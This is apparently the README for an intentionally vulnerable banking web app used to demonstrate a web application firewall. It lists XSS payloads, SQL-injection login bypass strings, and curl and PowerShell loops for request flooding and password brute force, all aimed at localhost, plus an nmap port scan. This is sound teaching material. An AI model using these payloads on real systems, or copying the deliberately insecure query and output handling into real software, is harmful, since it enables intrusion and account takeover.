# VaultBank — Intentionally Vulnerable Demo

> ⚠️ **FOR EDUCATIONAL USE ONLY.** This application is deliberately insecure.
> Run only in an isolated, offline environment. Never expose to the internet.

A realistic banking website with **5 intentional vulnerabilities** for demonstrating
CyberShield WAF protection in a live cybersecurity presentation.

---

## Quick Start

```bash
npm install
node server.js
```

Open **http://localhost:8080** in your browser.

The SQLite database (`vaultbank.db`) is created and seeded automatically on first run.

---

## Pages

| URL | Description |
|-----|-------------|
| `/` | Home / landing page |
| `/login` | Login form (SQL injection target) |
| `/dashboard` | Account overview, balance, transactions |
| `/transfer` | Send money form |
| `/search` | Transaction search (XSS target) |
| `/status` | Server uptime + request counter (DoS demo) |

---

## Demo Credentials

| Username | Password |
|----------|----------|
| `admin`  | `password123` |

---

## Vulnerabilities & How to Demo Them

### 1 — XSS (Cross-Site Scripting)

**Page:** `/search`

The search query is reflected back into the page heading using raw `innerHTML`
without any sanitisation. Script tags are also manually executed so the classic
`<script>` payload works in addition to event-handler payloads.

**Payloads to try (click the demo buttons on the page, or type manually):**

```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

Expected result (without WAF): an `alert()` dialog pops up.

---

### 2 — SQL Injection

**Page:** `/login`

The login query is built by string concatenation:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

**Bypass payloads:**

| Username | Password | Effect |
|----------|----------|--------|
| `' OR 1=1--` | *(anything)* | Comments out password check — logs in as first user |
| `admin'--` | *(anything)* | Logs in as `admin` without knowing the password |
| `' OR '1'='1'--` | *(anything)* | Alternative classic bypass |

Expected result (without WAF): successful login with `admin`'s account data returned.

---

### 3 — DoS (Denial of Service)

**Endpoint:** `/status`  
**Target:** Any endpoint (no rate limiting anywhere)

Every request hits the SQLite database (no caching), so a flood of requests
causes measurable CPU/IO pressure. Use `/status` to watch the counters climb.

**Demo script (bash):**

```bash
# Flood the server and watch /status for slowdown
for i in $(seq 1 500); do curl -s http://localhost:8080/api/search?q=salary & done
wait

# Check impact
curl http://localhost:8080/status
```

**Demo script (PowerShell):**

```powershell
1..500 | ForEach-Object -Parallel {
  Invoke-WebRequest -Uri "http://localhost:8080/api/search?q=salary" -UseBasicParsing | Out-Null
} -ThrottleLimit 50

Invoke-RestMethod http://localhost:8080/status
```

Expected result (without WAF): `requests_per_min` spikes, response latency increases.

---

### 4 — Brute Force

**Endpoint:** `POST /api/login`

No lockout, no delay, no CAPTCHA. The API returns clear JSON so automated
scripts can trivially parse success vs. failure.

**Demo script (bash):**

```bash
# Try a wordlist against the login endpoint
for pass in 123456 password admin letmein password123 secret; do
  result=$(curl -s -X POST http://localhost:8080/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}")
  echo "$pass -> $result"
done
```

**Demo script (PowerShell):**

```powershell
$passwords = @('123456','password','admin','letmein','password123','secret')
foreach ($pass in $passwords) {
  $body = @{ username='admin'; password=$pass } | ConvertTo-Json
  $r = Invoke-RestMethod -Uri http://localhost:8080/api/login -Method POST `
       -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue
  Write-Host "$pass -> success=$($r.success)"
}
```

Expected result (without WAF): all 500 attempts complete instantly; `password123` returns `success: true`.

---

### 5 — Port Scan

**Ports:** `3001`, `3002`, `3003`, `8080`

Three extra HTTP services listen alongside the main app, simulating exposed
internal services a port scanner would discover.

**Demo (nmap):**

```bash
nmap -sV -p 3001-3003,8080 localhost
```

**Demo (manual curl):**

```bash
curl http://localhost:3001   # VaultBank Admin Panel v1.2
curl http://localhost:3002   # VaultBank Internal API v2.0
curl http://localhost:3003   # VaultBank Database Monitor
```

Expected result (without WAF): all four ports respond, revealing the service fingerprint.

---

## Architecture

```
server.js          Express app on port 8080 + raw HTTP servers on 3001/3002/3003
vaultbank.db       SQLite database (auto-created on first run)
public/
  index.html       Home page
  login.html       Login — SQL injection target
  dashboard.html   Account dashboard
  transfer.html    Money transfer
  search.html      Transaction search — XSS target
```

## Dependencies

| Package | Purpose |
|---------|---------|
| `express` | HTTP server |
| `better-sqlite3` | Synchronous SQLite driver |

Install: `npm install`  
Run: `node server.js`
